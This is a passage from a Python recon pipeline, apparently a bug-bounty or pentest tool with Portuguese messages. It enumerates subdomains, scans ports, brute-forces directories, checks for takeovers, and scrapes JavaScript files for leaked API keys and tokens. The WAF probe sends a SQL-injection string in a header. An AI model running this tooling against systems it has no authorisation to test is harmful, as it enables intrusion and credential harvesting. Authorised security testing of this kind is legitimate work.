    passive_dir = f"{cfg.dir_disc}/passive"
    Path(passive_dir).mkdir(exist_ok=True)
    passive_subs = f"{passive_dir}/passive_subs.txt"
    Path(passive_subs).touch()

    # crt.sh
    log("Consultando crt.sh...")
    try:
        url = f"https://crt.sh/?q=%.{cfg.domain}&output=json"
        req = urllib.request.Request(url, headers={'Accept':'application/json','User-Agent':random_ua()})
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = json.loads(resp.read())
        names = set()
        for entry in data:
            for name in entry.get('name_value','').splitlines():
                name = name.strip().lstrip('*.').lower()
                if name and '.' in name:
                    names.add(name)
        with open(passive_subs,'a') as f:
            f.write('\n'.join(sorted(names))+'\n')
        success(f"crt.sh: {len(names)} subdomínios")
    except Exception as e:
        warn(f"crt.sh: {e}")

    # HackerTarget
    try:
        url = f"https://api.hackertarget.com/hostsearch/?q={cfg.domain}"
        req = urllib.request.Request(url, headers={'User-Agent':random_ua()})
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = resp.read().decode(errors='replace')
        if 'error' not in data.lower() and 'API count' not in data:
            with open(passive_subs,'a') as f:
                for line in data.splitlines():
                    host = line.split(',')[0].strip()
                    if re.match(r'^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$', host):
                        f.write(host+'\n')
            success(f"HackerTarget: {len(data.splitlines())} registros")
    except Exception as e:
        warn(f"HackerTarget: {e}")

    # AlienVault OTX
    try:
        url = f"https://otx.alienvault.com/api/v1/indicators/domain/{cfg.domain}/passive_dns"
        req = urllib.request.Request(url, headers={'Accept':'application/json','User-Agent':random_ua()})
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read())
        with open(passive_subs,'a') as f:
            for entry in data.get('passive_dns',[]):
                h = entry.get('hostname','')
                if h and '.' in h and not h.startswith('*'):
                    f.write(h.lower()+'\n')
        success("AlienVault OTX OK")
    except Exception as e:
        warn(f"AlienVault OTX: {e}")

    if cfg.shodan_api_key:
        try:
            url = f"https://api.shodan.io/dns/domain/{cfg.domain}?key={cfg.shodan_api_key}"
            req = urllib.request.Request(url, headers={'Accept':'application/json','User-Agent':random_ua()})
            with urllib.request.urlopen(req, timeout=20) as resp:
                data = json.loads(resp.read())
            domain_val = data.get('domain','')
            with open(passive_subs,'a') as f:
                for sub in data.get('subdomains',[]):
                    f.write(f"{sub}.{domain_val}".lower()+'\n')
            success("Shodan DNS OK")
        except Exception as e:
            warn(f"Shodan: {e}")

    clean = sorted(set(
        l for l in safe_read(passive_subs)
        if re.match(r'^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$', l) and cfg.domain in l
    ))
    clean_file = f"{passive_dir}/passive_subs_clean.txt"
    with open(clean_file,'w') as f:
        f.write('\n'.join(clean)+'\n')
    success(f"Passive intel total: {len(clean)} subdomínios")
    if clean:
        subs_all = f"{cfg.dir_disc}/subs_all.txt"
        with open(subs_all,'a') as f:
            f.write('\n'.join(clean)+'\n')
        sort_unique_file(subs_all)


# ─────────────────────────────────────────────────────────────────────────────
# STEP 01 — SUBDOMAIN ENUMERATION
# ─────────────────────────────────────────────────────────────────────────────
def step_subdomains():
    section("01 / ENUMERAÇÃO DE SUBDOMÍNIOS")

    def run_sub(name, cmd, outfile):
        if not circuit_breaker.allow(name):
            Path(outfile).touch(); return
        log(f"Rodando {name}...")
        rc, stdout, stderr = tool_runner.run(name, cmd, timeout=300)
        if rc < 0:
            circuit_breaker.record_failure(name)
            Path(outfile).touch()
            return
        circuit_breaker.record_success(name)
        lines = sorted(set(l.strip() for l in stdout.splitlines() if l.strip()))
        try:
            with open(outfile, 'w') as f:
                f.write('\n'.join(lines) + '\n')
        except OSError as e:
            log_err(f"{name}: não foi possível salvar resultado — {e}")
        success(f"{name}: {len(lines)} subdomínios")

    sf_args = ['subfinder','-d',cfg.domain,'-silent']
    if cfg.deep_mode:
        sf_args.append('-all')
    run_sub("subfinder", sf_args, f"{cfg.dir_disc}/subs_subfinder.txt")

    if cfg.has_assetfinder:
        run_sub("assetfinder", ['assetfinder','--subs-only',cfg.domain], f"{cfg.dir_disc}/subs_assetfinder.txt")
    else:
        Path(f"{cfg.dir_disc}/subs_assetfinder.txt").touch()

    if cfg.has_findomain:
        run_sub("findomain", ['findomain','-t',cfg.domain,'-q'], f"{cfg.dir_disc}/subs_findomain.txt")
    else:
        Path(f"{cfg.dir_disc}/subs_findomain.txt").touch()

    if cfg.has_amass:
        amass_args = ['amass','enum']
        amass_args += ['-passive','-d',cfg.domain,'-silent'] if not cfg.deep_mode else ['-d',cfg.domain,'-silent']
        run_sub("amass", amass_args, f"{cfg.dir_disc}/subs_amass.txt")
    else:
        Path(f"{cfg.dir_disc}/subs_amass.txt").touch()

    all_subs = set()
    for f in ['subs_subfinder.txt','subs_assetfinder.txt','subs_findomain.txt','subs_amass.txt']:
        all_subs.update(safe_read(f"{cfg.dir_disc}/{f}"))
    valid = sorted(s for s in all_subs if re.match(r'^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$', s))
    with open(f"{cfg.dir_disc}/subs_all.txt",'w') as f:
        f.write('\n'.join(valid)+'\n')
    success(f"Total subdomínios únicos: {len(valid)}")

    # Delta mode: mostra apenas novos
    if cfg.delta_mode and cfg.sqlite_db:
        new_subs = db_get_new_subdomains(valid)
        if new_subs:
            warn(f"DELTA: {len(new_subs)} subdomínios NOVOS desde o último scan!")
            with open(f"{cfg.dir_disc}/subs_new.txt",'w') as f:
                f.write('\n'.join(new_subs)+'\n')
        else:
            info("DELTA: nenhum subdomínio novo")
    # Salva no banco
    if cfg.sqlite_db:
        for s in valid:
            db_save_subdomain(s)


# ─────────────────────────────────────────────────────────────────────────────
# STEP 02 — ALIVE CHECK
# ─────────────────────────────────────────────────────────────────────────────
def step_alive():
    section("02 / VERIFICAÇÃO DE HOSTS ATIVOS")
    subs_all  = f"{cfg.dir_disc}/subs_all.txt"
    alive_det = f"{cfg.dir_disc}/alive_detailed.txt"
    alive     = f"{cfg.dir_disc}/alive.txt"
    log("Rodando httpx...")
    if not circuit_breaker.allow("httpx"):
        Path(alive_det).touch(); Path(alive).touch(); return
    rc, _, err = tool_runner.run(
        "httpx",
        ['httpx', '-l', subs_all, '-silent', '-threads', str(cfg.threads),
         '-status-code', '-title', '-tech-detect', '-content-length',
         '-follow-redirects', '-o', alive_det],
        timeout=600
    )
    if rc < 0:
        circuit_breaker.record_failure("httpx")
        warn("httpx falhou — resultado de hosts ativos pode estar vazio")
    else:
        circuit_breaker.record_success("httpx")
    # Extract URLs
    lines = safe_read(alive_det)
    urls = [l.split()[0] for l in lines if l.startswith('http')]
    try:
        with open(alive, 'w') as f:
            f.write('\n'.join(sorted(set(urls))) + '\n')
    except OSError as e:
        log_err(f"step_alive: não foi possível salvar alive.txt — {e}")
    success(f"Hosts ativos: {count_lines(alive)}")

    # Status breakdown
    status_counts: Counter = Counter()
    for l in lines:
        m = re.search(r'\[(\d{3})\]', l)
        if m:
            status_counts[m.group(1)] += 1
    for code, cnt in sorted(status_counts.items()):
        info(f"  HTTP {code}: {cnt}")

    # Tech detect
    tech_from_httpx = f"{cfg.dir_extra}/technologies_httpx.txt"
    with open(tech_from_httpx,'w') as f:
        for l in lines:
            if '[' in l and ']' in l:
                f.write(l+'\n')


# ─────────────────────────────────────────────────────────────────────────────
# STEP 03 — PORT SCAN
# ─────────────────────────────────────────────────────────────────────────────
def step_ports():
    section("03 / PORT SCAN")
    if not cfg.has_naabu:
        warn("naabu não encontrado — pulando port scan"); return
    alive = f"{cfg.dir_disc}/alive.txt"
    if is_empty(alive):
        warn("Sem hosts ativos para port scan"); return

    ports_out = f"{cfg.dir_disc}/ports.txt"
    log("Rodando naabu (top 1000 portas)...")
    try:
        subprocess.run(
            ['naabu','-l',alive,'-top-ports','1000','-silent','-o',ports_out,
             '-rate','300','-timeout',str(cfg.timeout*1000)],
            # v6 FIX: text=True obrigatório para errors='replace' funcionar;
            # sem ele subprocess retorna bytes e errors= é ignorado silenciosamente.
            timeout=600, capture_output=True, text=True, errors='replace'
        )
    except Exception as e:
        log_err(f"naabu: {e}"); Path(ports_out).touch()
    success(f"Portas encontradas: {count_lines(ports_out)}")
    interesting_ports = ['21','22','23','25','53','80','443','3306','5432','6379','27017',
                         '8080','8443','8888','9200','5601','4848','8161','61616']
    interesting_file = f"{cfg.dir_disc}/ports_interesting.txt"
    with open(interesting_file,'w') as f:
        for l in safe_read(ports_out):
            port = l.split(':')[-1] if ':' in l else ''
            if port in interesting_ports:
                f.write(l+'\n')
    if not is_empty(interesting_file):
        warn(f"Portas interessantes: {count_lines(interesting_file)}")
    else:
        info("Portas interessantes: 0")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 04 — SCREENSHOTS
# ─────────────────────────────────────────────────────────────────────────────
def step_screenshots():
    section("04 / SCREENSHOTS")
    if cfg.skip_screenshots:
        warn("Screenshots desabilitadas via --no-screenshots"); return
    if not cfg.has_gowitness:
        warn("gowitness não encontrado — pulando screenshots"); return
    alive = f"{cfg.dir_disc}/alive.txt"
    if is_empty(alive):
        warn("Sem hosts para capturar"); return
    log("Capturando screenshots com gowitness v3...")
    try:
        subprocess.run(
            ['gowitness','scan','file','-f',alive,
             '--screenshot-path',cfg.dir_shots,'--no-db'],
            timeout=600, capture_output=True, errors='replace'
        )
    except Exception as e:
        log_err(f"gowitness: {e}")
    shots = len(glob.glob(f"{cfg.dir_shots}/*.png") + glob.glob(f"{cfg.dir_shots}/*.jpg"))
    success(f"Screenshots: {shots}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 05 — SUBDOMAIN TAKEOVER (v3: filtra FPs do subzy)
# ─────────────────────────────────────────────────────────────────────────────
def step_takeover():
    section("05 / SUBDOMAIN TAKEOVER CHECK")
    takeover_file = f"{cfg.dir_extra}/takeover.txt"
    Path(takeover_file).touch()
    subs_all = f"{cfg.dir_disc}/subs_all.txt"
    if is_empty(subs_all):
        warn("Sem subdomínios para takeover check"); return
    if not cfg.has_subzy:
        warn("subzy não encontrado — pulando"); return

    log("Verificando subdomain takeover com subzy...")
    try:
        r = subprocess.run(
            ['subzy','run','--targets',subs_all,'--concurrency','30',
             '--https','--output',takeover_file],
            capture_output=True, text=True, timeout=300, errors='replace'
        )
    except Exception as e:
        log_err(f"subzy: {e}")

    # v3 FIX: filtra apenas resultados realmente vulneráveis (VULNERABLE tag)
    if os.path.exists(takeover_file):
        all_lines = safe_read(takeover_file)
        vuln_lines = [l for l in all_lines
                      if re.search(r'VULNERABLE|vulnerable|takeover|fingerprint', l, re.I)
                      and not re.search(r'NOT_VULNERABLE|not vulnerable', l, re.I)]
        with open(takeover_file,'w') as f:
            f.write('\n'.join(vuln_lines)+'\n')
        n = len(vuln_lines)
        if n > 0:
            warn(f"Takeover CONFIRMADO: {n} subdomínios vulneráveis")
            send_webhook("Subdomain Takeover Detectado",
                         f"{n} subdomínios vulneráveis em {cfg.domain}\n" +
                         "\n".join(vuln_lines[:5]),
                         severity="critical")
        else:
            info("Takeover: nenhum confirmado")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 06 — URL COLLECTION
# ─────────────────────────────────────────────────────────────────────────────
def step_urls():
    section("06 / COLETA DE URLs")
    alive = f"{cfg.dir_disc}/alive.txt"
    urls_dir = cfg.dir_urls

    def run_url(name, cmd, outfile, input_data=None):
        log(f"{name}...")
        if not circuit_breaker.allow(name):
            Path(outfile).touch(); return
        rc, stdout, _ = tool_runner.run(name, cmd, timeout=600, input_data=input_data)
        if rc < 0:
            circuit_breaker.record_failure(name)
            Path(outfile).touch()
            return
        circuit_breaker.record_success(name)
        lines = sorted(set(l.strip() for l in stdout.splitlines()
                           if l.strip().startswith('http')))
        try:
            with open(outfile, 'w') as f:
                f.write('\n'.join(lines) + '\n')
        except OSError as e:
            log_err(f"{name}: não foi possível salvar — {e}")
        success(f"{name}: {len(lines)} URLs")

    hosts = '\n'.join(safe_read(alive))
    run_url("waybackurls", ['waybackurls'], f"{urls_dir}/wayback.txt", input_data=hosts)
    run_url("gau", ['gau','--threads',str(cfg.gau_threads),'--subs',cfg.domain],
            f"{urls_dir}/gau.txt")

    katana_args = ['katana','-list',alive,'-silent','-jc','-d',str(cfg.katana_depth),
                   '-c',str(cfg.threads),'-nc']
    if cfg.deep_mode:
        katana_args += ['-aff','-xhr']
    run_url("katana", katana_args, f"{urls_dir}/katana.txt")

    # Merge
    all_urls = set()
    for f in ['wayback.txt','gau.txt','katana.txt']:
        all_urls.update(safe_read(f"{urls_dir}/{f}"))
    valid = sorted(u for u in all_urls if u.startswith('http'))
    with open(f"{urls_dir}/urls_all.txt",'w') as f:
        f.write('\n'.join(valid)+'\n')
    success(f"Total URLs únicas: {len(valid)}")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 07 — URL FILTER
# ─────────────────────────────────────────────────────────────────────────────
def step_filter_urls():
    section("07 / FILTRAGEM E CATEGORIZAÇÃO DE URLs")
    all_file = f"{cfg.dir_urls}/urls_all.txt"
    if is_empty(all_file):
        warn("Sem URLs para filtrar"); return

    # Filter with uro
    try:
        r = subprocess.run(['uro'], input=open(all_file).read(),
                           capture_output=True, text=True, timeout=120, errors='replace')
        clean = sorted(set(l.strip() for l in r.stdout.splitlines()
                           if l.strip() and l.strip().startswith('http')
                           and not re.search(r'\.(png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|mp4|mp3|zip|pdf)(\?|$)', l, re.I)))
    except Exception:
        clean = safe_read(all_file)
    with open(f"{cfg.dir_urls}/urls_clean.txt",'w') as f:
        f.write('\n'.join(clean)+'\n')
    success(f"URLs limpas: {len(clean)}")

    # Categorize
    cats = {
        'php':   (r'\.php(\?|$)', f"{cfg.dir_urls}/urls_php.txt"),
        'aspx':  (r'\.(asp|aspx)(\?|$)', f"{cfg.dir_urls}/urls_asp.txt"),
        'api':   (r'/(api|v[0-9]+|rest|graphql)', f"{cfg.dir_urls}/urls_api.txt"),
        'admin': (r'/(admin|dashboard|panel|manager|backend|wp-admin|cpanel|portal|internal|console|staff)', f"{cfg.dir_urls}/urls_admin.txt"),
        'js':    (r'\.js(\?|$)', f"{cfg.dir_urls}/urls_js.txt"),
    }
    for name, (pattern, outfile) in cats.items():
        matched = sorted(set(u for u in clean if re.search(pattern, u, re.I)))
        with open(outfile,'w') as f:
            f.write('\n'.join(matched)+'\n')
        info(f"  {name.upper():<10}: {len(matched)}")

    # JS files
    with open(f"{cfg.dir_js}/js_files.txt",'w') as f:
        f.write(open(f"{cfg.dir_urls}/urls_js.txt").read())


# ─────────────────────────────────────────────────────────────────────────────
# STEP 07b — WAF DETECT (v3: parse limpo, sem ANSI)
# ─────────────────────────────────────────────────────────────────────────────
def step_waf_detect():
    section("07b / WAF DETECTION")
    waf_file = f"{cfg.dir_extra}/waf_detected.txt"
    Path(waf_file).touch()
    targets = read_head(f"{cfg.dir_disc}/alive.txt", cfg.limit_waf)
    if not targets:
        warn("Sem hosts para WAF detect"); return

    # wafw00f com parse limpo (v3 fix)
    if cfg.has_wafw00f:
        log(f"Rodando wafw00f nos primeiros {len(targets)} hosts...")

        def run_wafw00f(url):
            try:
                r = subprocess.run(
                    ['wafw00f', url, '-a'],
                    capture_output=True, text=True, timeout=30, errors='replace'
                )
                clean_out = strip_ansi(r.stdout)
                # Extrai WAF detectado do output limpo
                for line in clean_out.splitlines():
                    m = re.search(r'is behind\s+(.+)', line, re.I)
                    if m:
                        waf_name = m.group(1).strip()
                        return f"{url} | WAF={waf_name}"
                    if re.search(r'No WAF|no firewall', line, re.I):
                        return None
                return None
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            results = list(ex.map(run_wafw00f, targets))
        for r in results:
            if r:
                append_line(waf_file, r)
                warn(f"WAF detectado: {r}")

    # Fingerprint manual via headers
    waf_sigs = {
        'cloudflare':   ['cf-ray:','cloudflare'],
        'akamai':       ['akamai-ghost-ip','x-check-cacheable'],
        'imperva':      ['x-iinfo:','incap_ses'],
        'modsecurity':  ['mod_security','modsec','x-modsec'],
        'awswaf':       ['x-amzn-requestid','awswaf'],
        'f5':           ['bigip','x-wa-info:'],
        'sucuri':       ['x-sucuri-id:','sucuri'],
    }
    log(f"Fingerprint manual WAF em {len(targets)} hosts...")
    for url in targets:
        try:
            r = subprocess.run(
                ['curl','-sk','--max-time',str(cfg.timeout),'-I',
                 '-H','X-Test: 1 OR 1=1-- -', url],
                capture_output=True, text=True, timeout=cfg.timeout+5
            )
            resp_lower = strip_ansi(r.stdout).lower()
            for waf_name, patterns in waf_sigs.items():
                if any(p in resp_lower for p in patterns):
                    append_line(waf_file, f"{url} | WAF={waf_name} [fingerprint]")
                    break
        except Exception:
            pass
        curl_throttle()

    n_waf = count_lines(waf_file)
    if n_waf > 0:
        warn(f"WAF detectado em {n_waf} hosts")
        cfg.waf_detected = True
    else:
        info("Nenhum WAF identificado")
        cfg.waf_detected = False


# ─────────────────────────────────────────────────────────────────────────────
# STEP 08 — JS ANALYSIS + SECRET VALIDATION (v3)
# ─────────────────────────────────────────────────────────────────────────────
def step_js():
    section("08 / ANÁLISE DE ARQUIVOS JS")
    js_files = read_head(f"{cfg.dir_js}/js_files.txt", cfg.limit_js_endpoints)
    if not js_files:
        warn("Nenhum arquivo JS encontrado")
        for f in ['js_endpoints.txt','js_secrets.txt']:
            Path(f"{cfg.dir_js}/{f}").touch()
        return

    secret_patterns = [
        (r'api[_-]?key\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})',  'api_key'),
        (r'secret[_-]?key\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})', 'secret_key'),
        (r'access[_-]?token\s*[:=]\s*["\']([a-zA-Z0-9_.\-]{20,})', 'access_token'),
        (r'password\s*[:=]\s*["\']([^"\']{8,})',  'password'),
        (r'bearer\s+([a-zA-Z0-9_.\-]{20,})',      'bearer_token'),
        (r'(AKIA[0-9A-Z]{16})',                    'aws_access_key'),
        (r'(ASIA[0-9A-Z]{16})',                    'aws_session_key'),
        (r'(ghp_[a-zA-Z0-9]{36})',                 'github_pat'),
        (r'(ghs_[a-zA-Z0-9]{36})',                 'github_secret'),
        (r'(eyJ[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*)', 'jwt'),
        (r'(AIza[0-9A-Za-z\-_]{35})',              'google_api'),
        (r'(sk-[a-zA-Z0-9]{40,})',                 'openai_key'),
        (r'(SG\.[a-zA-Z0-9_\-]{22,}\.[a-zA-Z0-9_\-]{43,})', 'sendgrid'),
        (r'(xox[baprs]-[0-9a-zA-Z]{10,})',         'slack_token'),
        (r'(sk_live_[a-zA-Z0-9]{24,})',            'stripe_secret'),
        (r'(pk_live_[a-zA-Z0-9]{24,})',            'stripe_public'),
    ]

    log(f"Analisando {len(js_files)} arquivos JS...")
    ep_raw  = f"{cfg.dir_js}/js_endpoints_raw.txt"
    sec_file = f"{cfg.dir_js}/js_secrets.txt"
    Path(ep_raw).touch(); Path(sec_file).touch()

    def analyze_js(jsurl):
        status, content = cfetch(jsurl)
        if not content:
            curl_throttle(); return
        endpoints = re.findall(r'(https?://[^"\'\s> ]+|/[a-zA-Z0-9_/.\-]{3,})', content)
        with _log_lock:
            with open(ep_raw,'a') as f:
                for ep in endpoints:
                    if ep != '//':
                        f.write(ep+'\n')
        for pat, pat_name in secret_patterns:
            for match in re.finditer(pat, content, re.I):
                secret_val = match.group(1) if match.lastindex else match.group()
                with _log_lock:
                    with open(sec_file,'a') as f:
                        f.write(f"[{pat_name}] [{jsurl}] {secret_val[:150]}\n")
        curl_throttle()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        list(ex.map(analyze_js, js_files))

    lines = sorted(set(safe_read(ep_raw)))
    with open(f"{cfg.dir_js}/js_endpoints.txt",'w') as f:
        f.write('\n'.join(lines)+'\n')
    success(f"Endpoints extraídos de JS: {len(lines)}")

    # v3: Validate secrets
    secrets = safe_read(sec_file)
    if secrets and cfg.validate_secrets:
        log(f"Validando {len(secrets)} secrets encontrados...")
        validated = f"{cfg.dir_js}/js_secrets_validated.txt"
        for line in secrets[:50]:
            m_jwt = re.search(r'eyJ[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*', line)
            if m_jwt:
                try:
                    parts = m_jwt.group().split('.')
                    if len(parts) >= 2:
                        payload_b64 = parts[1] + '=='
                        decoded = json.loads(base64.b64decode(payload_b64).decode(errors='replace'))
                        exp = decoded.get('exp', 0)
                        is_expired = (exp > 0 and exp < time.time())
                        status_str = "EXPIRADO" if is_expired else "ATIVO"
                        append_line(validated, f"[JWT {status_str}] exp={exp} | {line[:100]}")
                except Exception:
                    append_line(validated, f"[JWT INVALID] {line[:100]}")
        if os.path.exists(validated):
            success(f"Secrets validados → {validated}")

    n_sec = count_lines(sec_file)
    if n_sec > 0:
        warn(f"Possíveis secrets em JS: {n_sec}")
    else:
        info("Nenhum secret encontrado em JS")

    # TruffleHog
    if cfg.has_trufflehog:
        log("Rodando TruffleHog v3...")
        th_dir = tempfile.mkdtemp()
        for jsurl in read_head(f"{cfg.dir_js}/js_files.txt", cfg.limit_js_secrets):
            fname = f"{abs(hash(jsurl)) % 1000000:08x}.js"
            try:
                subprocess.run(['curl','-sk','--max-time',str(cfg.timeout),'-o',
                                f"{th_dir}/{fname}",jsurl], timeout=cfg.timeout+5, capture_output=True)
            except Exception:
                pass
        try:
            r = subprocess.run(['trufflehog','filesystem',th_dir,'--json','--no-verification'],
                               capture_output=True, text=True, timeout=120, errors='replace')
            with open(f"{cfg.dir_js}/trufflehog.txt",'w') as f:
                f.write(r.stdout)
            success(f"TruffleHog: {count_lines(cfg.dir_js+'/trufflehog.txt')} findings")
        except Exception as e:
            log_err(f"trufflehog: {e}")
        shutil.rmtree(th_dir, ignore_errors=True)


# ─────────────────────────────────────────────────────────────────────────────
# STEP 09 — PARAMETERS
# ─────────────────────────────────────────────────────────────────────────────
def step_params():
    section("09 / EXTRAÇÃO DE PARÂMETROS")
    urls = safe_read(f"{cfg.dir_urls}/urls_clean.txt")
    params_raw = sorted(set(u for u in urls if '?' in u and '=' in u))
    with open(f"{cfg.dir_params}/params_raw.txt",'w') as f:
        f.write('\n'.join(params_raw)+'\n')
    success(f"URLs com parâmetros (raw): {len(params_raw)}")

    if not params_raw:
        warn("Nenhuma URL com parâmetros")
        for fn in ['params.txt','params_fuzz.txt','params_alive.txt']:
            Path(f"{cfg.dir_params}/{fn}").touch()
        return

    try:
        r = subprocess.run(['uro'], input='\n'.join(params_raw),
                           capture_output=True, text=True, timeout=120, errors='replace')
        params = sorted(set(l.strip() for l in r.stdout.splitlines() if l.strip()))
        if not params:
            params = params_raw
    except Exception:
        params = params_raw
    with open(f"{cfg.dir_params}/params.txt",'w') as f:
        f.write('\n'.join(params)+'\n')
    success(f"Parâmetros únicos (após uro): {len(params)}")

    try:
        r = subprocess.run(['qsreplace','FUZZ'], input='\n'.join(params),
                           capture_output=True, text=True, timeout=60, errors='replace')
        fuzz = sorted(set(l.strip() for l in r.stdout.splitlines() if l.strip()))
        with open(f"{cfg.dir_params}/params_fuzz.txt",'w') as f:
            f.write('\n'.join(fuzz)+'\n')
    except Exception:
        Path(f"{cfg.dir_params}/params_fuzz.txt").touch()

    if not is_empty(f"{cfg.dir_params}/params.txt"):
        try:
            subprocess.run(
                ['httpx','-l',f"{cfg.dir_params}/params.txt",'-silent','-threads',str(cfg.threads),
                 '-mc','200,301,302,403','-o',f"{cfg.dir_params}/params_alive.txt"],
                timeout=300, capture_output=True, errors='replace'
            )
        except Exception as e:
            log_err(f"httpx params: {e}"); Path(f"{cfg.dir_params}/params_alive.txt").touch()
    else:
        Path(f"{cfg.dir_params}/params_alive.txt").touch()
    success(f"Parâmetros com resposta: {count_lines(cfg.dir_params+'/params_alive.txt')}")

    # Param frequency
    from collections import Counter as _Counter
    names = re.findall(r'[?&]([^=&]+)=', '\n'.join(params))
    freq = _Counter(names).most_common()
    with open(f"{cfg.dir_params}/param_names.txt",'w') as f:
        for name, cnt in freq:
            f.write(f"{cnt:6d} {name}\n")

    # Arjun (optional)
    if cfg.has_arjun and not is_empty(f"{cfg.dir_disc}/alive.txt"):
        arjun_targets = read_head(f"{cfg.dir_disc}/alive.txt", cfg.limit_arjun)
        log(f"Rodando Arjun em {len(arjun_targets)} hosts...")
        arjun_tmpdir = tempfile.mkdtemp(prefix="arjun_")
        arjun_raw = f"{cfg.dir_params}/arjun_raw.txt"

        def run_arjun(url):
            safe_name = re.sub(r'[^a-zA-Z0-9]', '_', url)[:60]
            out_file = os.path.join(arjun_tmpdir, f"{safe_name}.txt")
            try:
                subprocess.run(['arjun','-u',url,'-t','3','-oT',out_file],
                               timeout=60, capture_output=True, errors='replace')
            except subprocess.TimeoutExpired:
                log_err(f"arjun timeout (60s) para {url}")
            except Exception as e:
                log_err(f"arjun {url}: {e}")

        arjun_deadline = time.time() + 600
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
            futures = {ex.submit(run_arjun, u): u for u in arjun_targets}
            for fut in concurrent.futures.as_completed(futures, timeout=600):
                if time.time() > arjun_deadline:
                    warn("Arjun: timeout global 10min")
                    ex.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    fut.result()
                except Exception:
                    pass

        all_arjun = []
        for tmp_file in glob.glob(os.path.join(arjun_tmpdir,"*.txt")):
            all_arjun.extend(safe_read(tmp_file))
        shutil.rmtree(arjun_tmpdir, ignore_errors=True)
        unique_arjun = sorted(set(l for l in all_arjun if l.strip()))
        with open(arjun_raw,'w') as f:
            f.write('\n'.join(unique_arjun)+'\n')
        success(f"Arjun: {len(unique_arjun)} parâmetros descobertos")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 10 — GF PATTERNS
# ─────────────────────────────────────────────────────────────────────────────
def step_gf():
    section("10 / FILTRAGEM GF (PADRÕES DE VULNERABILIDADE)")
    try:
        r = subprocess.run(['gf','-list'], capture_output=True, text=True, timeout=10)
        installed = set(r.stdout.splitlines())
    except Exception:
        installed = set()

    patterns = ['xss','sqli','lfi','rce','ssrf','redirect','ssti','idor',
                 'debug-pages','upload','interestingparams','aws-keys','cors']
    params = '\n'.join(safe_read(f"{cfg.dir_params}/params.txt"))

    for pat in patterns:
        outfile = f"{cfg.dir_vulns}/{pat}.txt"
        if pat in installed:
            try:
                r = subprocess.run(['gf',pat], input=params, capture_output=True,
                                   text=True, timeout=30, errors='replace')
                lines = sorted(set(l.strip() for l in r.stdout.splitlines() if l.strip()))
                with open(outfile,'w') as f:
                    f.write('\n'.join(lines)+'\n')
                if lines: success(f"gf {pat}: {len(lines)} candidatos")
                else: info(f"gf {pat}: 0")
            except Exception as e:
                log_err(f"gf {pat}: {e}"); Path(outfile).touch()
        else:
            warn(f"gf pattern '{pat}' não instalado — pulando")
            Path(outfile).touch()


# ─────────────────────────────────────────────────────────────────────────────
# STEP 11 — DIRECTORY BRUTEFORCE (ffuf)
# ─────────────────────────────────────────────────────────────────────────────
def step_ffuf():
    section("11 / DIRECTORY BRUTEFORCE (ffuf)")
    if not cfg.has_ffuf:
        warn("ffuf não encontrado — pulando"); return
    # v5: respeita RECON_WORDLIST do .env / env var antes dos defaults do sistema
    wordlist = None
    candidates = []
    if cfg.wordlist_path:
        candidates.append(cfg.wordlist_path)
    candidates += [
        '/usr/share/seclists/Discovery/Web-Content/common.txt',
        '/usr/share/wordlists/dirb/common.txt',
        '/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt',
        os.path.expanduser('~/wordlists/common.txt'),
    ]
    for wl in candidates:
        if wl and os.path.exists(wl):
            wordlist = wl; break
    if not wordlist:
        warn("Nenhuma wordlist para ffuf — defina RECON_WORDLIST=/caminho ou instale seclists"); return

    ffuf_dir = f"{cfg.dir_extra}/ffuf"
    Path(ffuf_dir).mkdir(exist_ok=True)
    targets = read_head(f"{cfg.dir_disc}/alive.txt", cfg.limit_ffuf)
    log(f"Rodando ffuf em {len(targets)} hosts...")

    def run_ffuf(target):
        safe_name = re.sub(r'https?://', '', target).replace('/','_').replace('.','_')
        out = f"{ffuf_dir}/{safe_name}.json"
        # v5 FIX: saída direto ao disco; stderr descartado para não saturar memória
        try:
            with open(out, 'w') as fout:
                proc = subprocess.Popen(
                    ['ffuf','-u',f"{target}/FUZZ",'-w',wordlist,
                     '-mc','200,201,204,301,302,307,401,403',
                     '-t',str(min(cfg.threads, 50)),'-timeout',str(cfg.timeout),
                     '-silent','-of','json'],
                    stdout=fout, stderr=subprocess.DEVNULL
                )
                with _child_lock:
                    _child_pids.add(proc.pid)
                try:
                    proc.wait(timeout=300)
                except subprocess.TimeoutExpired:
                    proc.kill(); proc.wait()
                finally:
                    with _child_lock:
                        _child_pids.discard(proc.pid)
        except OSError as e:
            log_err(f"ffuf OSError {target}: {e}")
        except subprocess.SubprocessError as e:
            log_err(f"ffuf SubprocessError {target}: {e}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        list(ex.map(run_ffuf, targets))
    success(f"ffuf: {len(glob.glob(ffuf_dir+'/*.json'))} arquivos gerados")


# ─────────────────────────────────────────────────────────────────────────────
# STEP 11b — 403 BYPASS (v3 — NOVO)
# ─────────────────────────────────────────────────────────────────────────────
def step_403_bypass():
    section("11b / 403 BYPASS")
    out_file = f"{cfg.dir_extra}/403_bypass.txt"
    Path(out_file).touch()

    # Coleta URLs com 403 do detailed alive
    alive_det = safe_read(f"{cfg.dir_disc}/alive_detailed.txt")
    urls_403 = []
    for l in alive_det:
        if '[403]' in l or '[401]' in l:
            parts = l.split()
            if parts and parts[0].startswith('http'):
                urls_403.append(parts[0])
    urls_403 = list(set(urls_403))[:cfg.limit_403bypass]

    if not urls_403:
